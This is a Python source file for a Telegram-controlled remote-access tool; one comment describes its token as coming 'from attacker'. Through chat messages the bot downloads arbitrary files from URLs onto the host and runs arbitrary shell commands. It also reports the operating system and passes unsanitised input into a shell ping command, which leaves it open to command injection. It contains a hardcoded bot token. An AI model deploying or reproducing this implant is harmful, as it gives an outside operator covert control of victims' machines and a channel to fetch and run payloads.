import time
import telebot
import subprocess
import os
import platform
import wget
import sys
if(len(sys.argv)<2):
    TOKEN="1791119401:AAFyp7tNLGFAVSz1cuIAGv1Cfty-w5NILvQ"  # get api of bot 
else:
    TOKEN =sys.argv[1] #input api from attacker
bot = telebot.TeleBot(token=TOKEN)
def findat(msg):
    # from a list of texts, it finds the one with the '@' sign
    for i in msg:
        if '@' in i:
            return i
def finddat1(msg):
    # from a list of texts, it finds the one with the 'ping' sign
    for i in msg:
        if 'ping' in i:
            return i
def finddatdownload(msg):
    # from a list of texts, it finds the one with the 'download' sign
    for i in msg:
        if 'download' in i:
            return i
def finddatrun(msg):
    # from a list of texts, it finds the one with the 'run' sign
    for i in msg:
        if 'run' in i:
            return i
def testping(msg): # ping a ip address 
    ip = msg[5:]
    current_os = platform.system().lower() # get current_os of system 
    if current_os == "windows":
        cmd="ping "+ ip
        exit_code = subprocess.call(cmd, shell=True)
    else:                                   #ubuntu 
        cmd="ping -c 4 -w10 "+ip
        exit_code = subprocess.call(cmd, shell=True)
    if exit_code == 0:              #ping success 
        test="System " + ip + " is UP !"
        return test
    else:                               #failed 
        test="System " + ip + " is down !"
        return test
def downloadfind(msg): #download a file 
    try:
        wget.download(msg[1],out=msg[2])
    except:
        pass
def runterminal(msg): # run the program with terminal 
    a=subprocess.call(msg, shell=True)
    return a

@bot.message_handler(commands=['start']) # welcome message handler
def send_welcome(message):
    bot.reply_to(message, '(placeholder text)')
@bot.message_handler(commands=['nameos']) # welcome message handler
def send_welcome(message):
    osname=os.name+""+platform.system()+""+platform.release()
    bot.reply_to(message, osname)
@bot.message_handler(commands=['help']) # help message handler
def send_welcome(message):
    bot.reply_to(message, 'ALPHA = FEATURES MAY NOT WORK')
@bot.message_handler(func=lambda msg: msg.text is not None and 'ping' in msg.text) # ping message 
def at_converter(message):
    texts = message.text.split("'")
    at_text = finddat1(texts)
    if at_text == 'ping': # in case it's just the 'ping', skip
        bot.reply_to(message,"please input the ip address")
        pass
    else:
        test=testping(at_text)
        bot.reply_to(message,test)
@bot.message_handler(func=lambda msg: msg.text is not None and '@' in msg.text) # message find the instagram 
def at_converter(message):
    texts = message.text.split()
    at_text = findat(texts)
    if at_text == '@': # in case it's just the '@', skip
        pass
    else:
        insta_link = "https://instagram.com/{}".format(at_text[1:])
        bot.reply_to(message, insta_link)
@bot.message_handler(func=lambda msg: msg.text is not None and 'download' in msg.text) # message download file 
def at_converter(message):
    texts = message.text.split("'")
    at_text = finddatdownload(texts)
    downloadfile=at_text.split(" ")
    downloadfind(downloadfile)
    if os.path.isfile(downloadfile[2])==False:
        bot.reply_to(message,"false")
    else:
        bot.reply_to(message,"succes")
@bot.message_handler(func=lambda msg: msg.text is not None and 'run' in msg.text) #message run program by terminal
def at_converter(message):
    texts = message.text.split("'")
    at_text = finddatrun(texts)
    runter=runterminal(at_text[3:])
    if runter==0:
        bot.reply_to(message,"succes")
    else:
        bot.reply_to(message,"failed")
while True:
    try:
        bot.polling(none_stop=True)
        # ConnectionError and ReadTimeout because of possible timout of the requests library
        # maybe there are others, therefore Exception
    except Exception:
        time.sleep(15)
